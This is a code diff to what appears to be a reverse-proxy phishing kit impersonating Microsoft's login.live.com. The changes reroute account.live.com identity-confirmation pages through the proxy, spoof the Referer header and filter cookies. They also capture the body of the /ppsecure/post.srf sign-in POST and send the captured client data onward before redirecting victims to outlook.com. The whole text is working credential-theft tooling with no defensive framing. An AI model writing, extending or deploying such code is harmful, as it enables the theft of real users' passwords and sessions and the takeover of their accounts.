@@ -28,10 +28,10 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
 
         super(proxyResp, browserEndPoint)
         this.regexes = [
-            //  {
-                // reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
-                // replacement: 'window.__BssoInterrupt_Core=!0;</script>'
-            //  },
+             {
+                reg: /https:\/\/account.live.com\/identity\/confirm/igm, // Google chrome on windows fix
+                replacement: '/identity/confirm/'
+             },
         ]
     }
 
@@ -40,6 +40,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
+
         const extRedirectObj = super.getExternalRedirect()
         if (extRedirectObj !== null) {
             const rLocation = extRedirectObj.url
@@ -48,9 +49,14 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                 return this.afterEmailPath()
             }
         }
-        if (this.proxyResp.headers['content-length'] < 1) {
-            return this.proxyResp.pipe(this.browserEndPoint)
-        }
+
+        let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
+        appHeaders = appHeaders.filter(appSingleHeader => {
+            return !appSingleHeader.startsWith('OParams=')
+        })
+        this.browserEndPoint.setHeader('set-cookie', appHeaders)
+
+
         // this.browserEndPoint.removeHeader('content-security-policy')
         let newMsgBody;
         return this.superPrepareResponse(true)
@@ -88,16 +94,20 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
+        this.req.headers['referer'] = 'https://login.live.com'
+
         this.req.headers['accept-encoding'] = 'gzip, br'
         if (this.req.method === 'POST') {
             // super.uploadRequestBody(clientContext.currentDomain, clientContext)
             if (this.req.url.startsWith('/ppsecure/post.srf?')) {
+                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                 clientContext.setLogAvailable(true)
             }
             
             super.captureBody(clientContext.currentDomain, clientContext)
 
         }
+    
 
 
         const redirectToken = this.checkForRedirect()
@@ -107,8 +117,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
         }
 
-        if (this.req.url === '/auth0/outlook/owa2') {
-            clientContext.setLogAvailable(true)
+
+        if (this.req.url.startsWith('/identity/confirm')) {
+            clientContext.currentDomain = 'account.live.com'
+
+        }
+
+        if (this.req.url === '/auth0/outlook/owa2' || this.req.url.startsWith('/SummaryPage.aspx')) {
             super.sendClientData(clientContext, {})
             this.res.writeHead('301', { location: 'https://outlook.com' })
             return this.res.end()
@@ -124,7 +139,14 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 const configExport = {
     CURRENT_DOMAIN: 'login.live.com',
+
+    EXTERNAL_FILTERS: 
+    [
+        'account.live.com',
+    ],
+
     START_PATH: '/',
+
     PRE_HANDLERS:
         [
         ],
